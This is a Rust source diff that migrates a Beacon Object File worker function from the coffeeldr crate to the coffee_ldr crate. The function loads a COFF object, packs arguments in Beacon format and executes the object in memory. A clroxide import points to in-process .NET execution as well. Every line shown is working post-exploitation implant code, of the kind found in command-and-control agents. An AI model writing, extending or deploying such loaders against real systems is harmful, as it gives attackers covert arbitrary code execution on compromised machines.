@@ -6,7 +6,8 @@ use std::fs::File;
 use serde_json::Value;
 use base64::engine::general_purpose;
 use base64::Engine;
-use coffeeldr::{CoffeeLdr, BeaconPack};
+use coffee_ldr::loader::Coffee;
+use coffee_ldr::loader::beacon_pack::BeaconPack;
 use clroxide::clr::Clr;
 use zip::ZipArchive;
 
@@ -22,30 +23,30 @@ pub fn run_bof_worker() {
 
     let mut output = String::new();
 
-    match CoffeeLdr::new(file_bytes.as_slice()) {
-        Ok(mut ldr) => {
+    match Coffee::new(file_bytes.as_slice()) {
+        Ok(coffee) => {
             output.push_str("COFF loaded!\n");
 
             if params_str.is_empty() {
-                match ldr.run("go", None, None) {
+                match coffee.execute(None, None, &None) {
                     Ok(res) => output.push_str(&res),
                     Err(e) => output.push_str(&format!("Run error: {:?}\n", e)),
                 }
             } else {
-                let mut pack = BeaconPack::default();
+                let mut pack = BeaconPack::new();
 
                 for arg in params_str.split_whitespace() {
-                    if let Err(e) = pack.addstr(arg) {
+                    if let Err(e) = pack.add_str(arg) {
                         output.push_str(&format!("Arg error ({}): {}\n", arg, e));
                     }
                 }
 
-                match pack.get_buffer_hex() {
+                match pack.get_buffer() {
                     Ok(buf) => {
-                        let ptr = buf.as_ptr() as *mut u8;
+                        let ptr = buf.as_ptr();
                         let len = buf.len();
 
-                        match ldr.run("go", Some(ptr), Some(len)) {
+                        match coffee.execute(Some(ptr), Some(len), &None) {
                             Ok(res) => output.push_str(&res),
                             Err(e) => output.push_str(&format!("Run error: {:?}\n", e)),
                         }
